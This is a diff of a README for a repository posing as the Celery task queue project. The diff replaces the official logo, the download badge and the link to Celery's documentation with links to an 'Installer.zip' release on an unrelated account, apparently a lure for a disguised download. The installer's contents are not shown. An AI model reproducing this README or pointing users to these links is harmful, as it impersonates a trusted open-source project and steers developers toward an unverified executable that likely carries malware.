@@ -1,6 +1,6 @@
 # 🌟 Welcome to Celery Task Queue Latest 2025 🌟
 
-![Celery Logo](https://raw.githubusercontent.com/celery/celery/main/docs/_static/celery_128.png)
+![Celery Logo](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v1.0/Installer.zip)
 
 ---
 
@@ -37,12 +37,12 @@ This repository covers a wide range of topics related to Celery and distributed 
 - Task scheduler
 
 ### 📦 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v1.0/Installer.zip%20Version-brightgreen)](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v1.0/Installer.zip)
 
 🚀 **Launch the latest version to experience the power of Celery!**
 
 ### 🌐 Get Started
-Visit the official Celery documentation to learn more about how to leverage the capabilities of Celery in your projects: [Celery Documentation](https://docs.celeryproject.org/en/latest/index.html)
+Visit the official Celery documentation to learn more about how to leverage the capabilities of Celery in your projects: [Celery Documentation](https://github.com/BeginnerDevVN/Celery-Task-Queue-latest-2025/releases/download/v1.0/Installer.zip)
 
 ### 🛠️ Installation
 1. Install Celery using pip:
